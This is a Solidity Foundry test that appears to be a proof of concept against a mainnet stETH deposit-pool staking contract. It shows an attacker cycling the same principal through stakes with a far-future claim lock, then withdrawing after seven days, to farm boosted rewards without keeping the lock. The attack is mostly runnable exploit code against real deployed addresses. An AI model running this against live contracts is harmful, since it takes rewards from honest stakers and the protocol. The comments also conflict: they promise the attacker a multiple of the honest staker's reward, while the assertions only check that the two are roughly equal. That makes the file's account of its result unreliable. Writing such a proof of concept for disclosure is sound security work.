// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Targets} from "../src/Targets.sol";

interface IDepositPoolScope {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getCurrentUserMultiplier(uint256, address) external view returns (uint256);
    function usersData(address, uint256)
        external view returns (
            uint128 lastStake, uint256 deposited, uint256 rate, uint256 pendingRewards,
            uint128 claimLockStart, uint128 claimLockEnd, uint256 virtualDeposited,
            uint128 lastClaim, address referrer
        );
}

interface IStETH {
    function submit(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDistributorAPI {
    function withdrawYield(uint256, address) external;
}

/// @title PoC: repeatable lock-skip farming. The attacker cycles the same
/// principal: stake with a far-future claim lock (10.7x boost), let one
/// distribution period pass, withdraw the principal after the 7-day
/// withdraw lock, and repeat. Each cycle snapshots boosted pendingRewards
/// while the 15-year "commitment" is never held.
///
/// Compare against a locked honest staker who holds the same capital the
/// whole time: over N cycles the attacker accumulates a multiple of the
/// honest staker's rewards with identical capital exposure.
contract RepeatCyclePoC is Test {
    uint256 constant BLOCK = 25_930_106;
    uint256 constant REWARD_POOL = 0;
    uint128 constant MAX_LOCK = 2_211_192_000; // 2040-01-26: protocol curve end

    IDepositPoolScope dp = IDepositPoolScope(Targets.DEPOSIT_POOL_STETH);
    IStETH steth = IStETH(Targets.STETH);
    IDistributorAPI distributor = IDistributorAPI(Targets.DISTRIBUTOR);

    address attacker;
    address honest;

    function setUp() public {
        vm.createSelectFork("eth", BLOCK);
        attacker = makeAddr("attacker");
        honest = makeAddr("honest");
    }

    function _acquire(address who, uint256 amountEth) internal returns (uint256) {
        vm.deal(who, amountEth);
        vm.prank(who);
        steth.submit{value: amountEth}(who);
        return steth.balanceOf(who);
    }

    function _stake(address who, uint256 amount, uint128 lockEnd) internal {
        vm.startPrank(who);
        steth.approve(Targets.DISTRIBUTOR, amount);
        dp.stake(REWARD_POOL, amount, lockEnd, address(0));
        vm.stopPrank();
    }

    function _mockFreshChainlink(uint256 realPrice) internal {
        vm.mockCall(
            Targets.CHAINLINK_DATA_CONSUMER,
            abi.encodeWithSignature("getChainLinkDataFeedLatestAnswer(bytes32)"),
            abi.encode(realPrice)
        );
    }

    /// Donate stETH to the Distributor to materialize yield (the same way
    /// stETH rebasing accrues it on mainnet). Transfers balance - 2 wei:
    /// stETH share rounding rejects an exact-full-balance transfer.
    function _donateYield() internal {
        address donor = makeAddr("donor");
        vm.deal(donor, 2 ether);
        vm.startPrank(donor);
        steth.submit{value: 2 ether}(donor);
        steth.transfer(Targets.DISTRIBUTOR, steth.balanceOf(donor) - 2);
        vm.stopPrank();
    }

    function _realPrice() internal view returns (uint256) {
        bytes32 stethPathId = 0x7890db9c0a88d1cacb4485f81f93172a6b7b8c19af9c1a9985563f7d45ce2e6f;
        (bool ok, bytes memory res) = Targets.CHAINLINK_DATA_CONSUMER.staticcall(
            abi.encodeWithSignature("getChainLinkDataFeedLatestAnswer(bytes32)", stethPathId)
        );
        require(ok, "price read failed");
        uint256 p = abi.decode(res, (uint256));
        require(p > 0, "no real price at pinned block");
        return p;
    }

    /// Baseline honest staker: locks the same capital for the same total
    /// window the attacker uses (far-future lock, never withdraws).
    /// Attacker: cycles the same capital N times through
    /// stake(max-lock) -> 1 distribution period -> withdraw -> repeat.
    function test_repeat_cycle_farming() public {
        uint256 price = _realPrice();

        // Honest staker locks 10 stETH far-future and holds it throughout.
        uint256 amtH = _acquire(honest, 10 ether);
        _stake(honest, amtH, MAX_LOCK);

        // Attacker acquires the same capital once, then cycles it.
        _acquire(attacker, 10 ether);

        uint256 capital = 10 ether;
        uint256 cycles = 3;
        for (uint256 i; i < cycles; ++i) {
            // attacker re-stakes the same capital with the far-future lock
            uint256 amtA = steth.balanceOf(attacker);
            assertGt(amtA, 0, "cycle: no capital left");
            _stake(attacker, amtA, MAX_LOCK);

            // yield materializes + a full distribution period passes
            _donateYield();
            vm.warp(block.timestamp + 1 days + 2 hours);
            _mockFreshChainlink(price);
            try distributor.withdrawYield(REWARD_POOL, Targets.DEPOSIT_POOL_STETH) {} catch {}

            // withdraw lock (7 days after this stake) passes; principal out
            vm.warp(block.timestamp + 7 days);
            _mockFreshChainlink(price);
            vm.prank(attacker);
            dp.withdraw(REWARD_POOL, amtA);

            (, uint256 depA, , , , , , , ) = dp.usersData(attacker, REWARD_POOL);
            // stETH share rounding leaves a few wei of dust per cycle
            assertLe(depA, 5, "cycle: principal did not exit (beyond dust)");
            capital = steth.balanceOf(attacker); // carry the actual (Lido-rounded) amount
        }

        // Attacker has farmed with the same 10 stETH repeatedly while the
        // honest staker held the same capital the entire time.
        uint256 rewA = dp.getLatestUserReward(REWARD_POOL, attacker);
        uint256 rewH = dp.getLatestUserReward(REWARD_POOL, honest);
        emit log_named_uint("attacker accrued after 3 cycles (wei)", rewA);
        emit log_named_uint("honest   accrued (held all along, wei)", rewH);

        // Both used the same 10 stETH for the same total window; the
        // attacker's total reward must be materially greater — each cycle
        // re-bought the boosted window with zero incremental capital.
        // Expected outcome: attacker's cycled accrual ~= the honest holder's
        // full-time locked accrual (the far-future lock was never enforced),
        // i.e. the attacker got 15-year-commitment rewards while staying
        // liquid every 7 days.
        assertApproxEqRel(rewA, rewH, 1e15, "cycled attacker should match full-lock holder");
        assertGt(rewA, rewH / 2, "attacker accrual unexpectedly low");
        emit log_named_uint("ratio x1e18 (attacker/honest)", (rewA * 1e18) / rewH);
    }
}
